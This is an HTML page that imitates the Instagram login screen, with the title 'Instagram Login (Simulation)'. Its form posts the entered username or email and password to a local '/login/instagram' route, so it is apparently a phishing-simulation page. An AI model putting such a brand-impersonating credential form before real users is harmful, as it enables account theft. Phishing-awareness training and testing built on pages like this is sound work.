<!doctype html>
<html>
  <head>
    <title>Instagram Login (Simulation)</title>
    <link rel="stylesheet" href="./style/insta-style.css" />

  </head>

  <body>
    <div class="container">
      <div class="login-box">
        <div class="logo">Instagram</div>

        <form action="/login/instagram" method="POST">
          <input
            type="text"
            name="email"
            placeholder="Phone number, username, or email"
            required
          />

          <input
            type="password"
            name="password"
            placeholder="Password"
            required
          />

          <button type="submit">Log In</button>
        </form>

        <div class="divider">OR</div>

        <div class="forgot">
          <a href="#">Forgot password?</a>
        </div>
      </div>

      <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
    </div>
  </body>
</html>
